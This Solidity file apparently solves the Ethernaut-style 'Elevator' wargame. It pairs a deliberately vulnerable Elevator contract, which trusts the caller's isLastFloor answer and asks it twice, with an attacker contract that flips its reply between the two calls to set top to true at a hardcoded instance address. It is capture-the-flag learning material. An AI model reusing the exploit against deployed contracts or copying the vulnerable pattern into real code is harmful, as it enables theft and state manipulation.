// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// goal reach op of the building
interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract attacker is Building {
  bool called;
  Elevator elevator = Elevator(0x48E802fF2aC2795edf8d8dC7E104D831c05b5c56);
  function isLastFloor(uint floor) external returns (bool) {
    bool currnt = called;
    called = !called;
    return currnt;
  }

  function foo() external {
    elevator.goTo(2);
  }
}